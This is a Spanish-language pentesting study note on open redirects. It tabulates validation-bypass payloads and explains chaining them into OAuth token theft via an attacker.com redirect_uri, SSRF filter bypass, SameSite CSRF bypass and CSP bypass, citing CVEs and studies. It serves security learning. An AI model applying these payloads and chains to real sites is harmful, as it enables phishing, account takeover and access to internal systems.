---
tags:
  - Web/Red-Team
  - Open-Redirect
  - Pentesting/Explotacion
Descripción: "Cuando el sitio valida el destino, la explotación es un juego de confundir al validador"
Fecha de actualización: 2026-07-27
Nota previa: "[[00 - Introducción a Open Redirect]]"
Nota siguiente: "[[02 - Detección, prevención y arsenal de Open Redirect]]"
Area: "[[Open Redirect.base|Open Redirect]]"
---
---

Cuando el sitio valida el destino, la explotación es un juego de **confundir al validador**. La clave que hay que interiorizar (Claroty Team82, Snyk, Orange Tsai): <mark style="background: #ADCCFFA6;">el bug moderno no es que los navegadores parseen distinto entre sí —Chrome/Firefox/Safari/Edge ya convergieron en el estándar WHATWG— sino el **desacuerdo entre el parser del navegador y el validador del backend**</mark>. El backend valida con regex/strings sobre semántica RFC-3986; el navegador normaliza según WHATWG. Ese hueco es el bypass.

# Bypasses de validación

| Técnica | Payload | Por qué funciona |
| - | - | - |
| Protocol-relative | `//evil.com` | El navegador lo resuelve con el esquema actual; rompe blocklists de `http://`/`https://` literales |
| Esquema sin barras | `https:evil.com` | Para esquemas "especiales" (http/https), el parser WHATWG fuerza el parseo de autoridad aunque falten las `//` |
| Backslash | `https://trusted.com\@evil.com`, `/\evil.com` | WHATWG normaliza `\`→`/`; el validador del backend rara vez trata `\` como separador |
| Userinfo `@` | `https://trusted.com@evil.com` | Todo lo anterior al `@` es *userinfo*; el host real es lo que sigue. Rompe `startsWith("https://trusted.com")` |
| Sufijo / substring | `trusted.com.evil.com` | El dominio registrable es `evil.com`; `trusted.com` es solo una etiqueta. Rompe `indexOf("trusted.com")` (el bug real de adobe.com) |
| Regex sin anclar/escapar | `app0example.com` vs patrón de `app.example.com` | Un `.` sin escapar en el regex es comodín (raíz de `CVE-2024-52289`, Authentik) |
| Ofuscación | `%09//evil.com` (tab), `/..//evil.com`, homoglifos IDN | El navegador normaliza el ruido tras la validación |
| `javascript:` / `data:` | `javascript:alert(document.cookie)`, `jaVAscript:` | **Solo en sinks de cliente** (`location`, `window.open`) → escala a [[00 - Introducción a XSS\|DOM XSS]]. En un `Location:` del servidor **no** funciona (Chromium lo bloquea con `ERR_UNSAFE_REDIRECT`) |

> [!warning]+ CRLF en el redirect: hoy casi legacy
> El truco `%0d%0aLocation: https://evil.com` (inyectar una segunda cabecera `Location`) sigue en las guías, pero los stacks modernos (Node `http`, contenedores servlet actuales) **rechazan CRLF crudo** en valores de cabecera. Probar solo en frameworks viejos o código que escribe cabeceras a mano ([[01 - Introducción a CRLF Injection|CRLF Injection]]).

# Chaining: el verdadero valor

Un open redirect suelto es phishing (bajo). Encadenado, escala fuerte:

- **OAuth `redirect_uri` → robo de token**. Si el *authorization server* valida el `redirect_uri` de forma laxa (ausente, por prefijo o por substring) en vez de exacta, `redirect_uri=https://target.com/redirect?url=https://attacker.com` rebota el `code`/token al atacante. <mark style="background: #FFB86CA6;">El [RFC 9700](https://www.rfc-editor.org/info/rfc9700/) (Best Current Practice de OAuth 2.0, 2025) **obliga** a *exact string matching* del `redirect_uri`</mark> — prohíbe wildcards y prefijos. Casos: GSA (H1 #665651, sin validación real), Authentik `CVE-2024-52289` (regex sin anclar → ATO de un clic). Ver [[08 - Robo de tokens de acceso OAuth]].
- **SSRF filter bypass**. Un guard SSRF bloquea IPs internas, pero un open redirect en el mismo host deja saltar: `path=http://192.168.0.12/admin` → el fetcher del servidor sigue el redirect a la IP interna. <mark style="background: #8000E1A6;">OWASP Top 10:2025 co-lista CWE-601 (open redirect) y CWE-918 (SSRF) bajo la misma categoría A01</mark> — el chaining ya es taxonomía oficial. Ver [[05 - Evasión de defensas SSRF|evasión SSRF]].
- **Client-side CSRF (bypass de SameSite)** — la escalada **nueva** (NDSS 2025, caso webnovel.com): un open redirect de cliente (`location.assign()`) apunta a un endpoint que cambia estado por GET. Como el redirect ocurre **en el cliente y dentro del propio sitio**, la petición final al endpoint se percibe como **same-site**, así que <mark style="background: #FF5582A6;">se cuela incluso bajo `SameSite=Strict`</mark> —que sí bloquea las navegaciones top-level cross-site (a diferencia de un `3xx` del servidor, que el navegador sí trata como cross-site). Es el lab *SameSite Strict bypass via client-side redirect* de PortSwigger.
- **CSP bypass**: si el `script-src` permite un dominio con un endpoint **JSONP** (históricamente `accounts.google.com`) o un open redirect, se cuela JS ejecutable — la CSP valida solo el host inicial, no el callback JSONP ni el destino del redirect (Weichselbaum & Spagnuolo, *CSP Is Dead, Long Live CSP*, Google 2016).
- **Fuga vía `Referer`**: matiz de 2025 — hoy los navegadores usan `strict-origin-when-cross-origin` por defecto (solo el origin cross-origin), así que esta fuga requiere que la app haya **aflojado** la política (`unsafe-url`); menos común, se ve en stacks con analítica/ads.

# No es "siempre informativo"

<mark style="background: #FF5582A6;">El encuadre clásico de "bajo impacto, solo phishing" está desactualizado</mark>. El estudio NDSS 2025 (Tranco top-10K) halló open redirect de cliente en **623 sitios** (~6,2% del top-10K), y un **11,5%** de esas vulnerabilidades escalaba a XSS/CSRF/fuga (afectando al **38%** de los sitios vulnerables). Y hay CVEs recientes que lo prueban: **`CVE-2026-33102`** (M365 Copilot, open redirect puro, **CVSS 9.3 crítico** según Microsoft) y **`CVE-2025-4123`** (Grafana, redirect→SSRF/ATO). La severidad es contextual: depende de con qué lo encadenes ([[04 - Mindset del cazador y encadenamiento de bugs|mindset de chaining]]).

Cómo cazarlos con herramientas y cómo cerrarlos, en la [[02 - Detección, prevención y arsenal de Open Redirect|nota siguiente]].
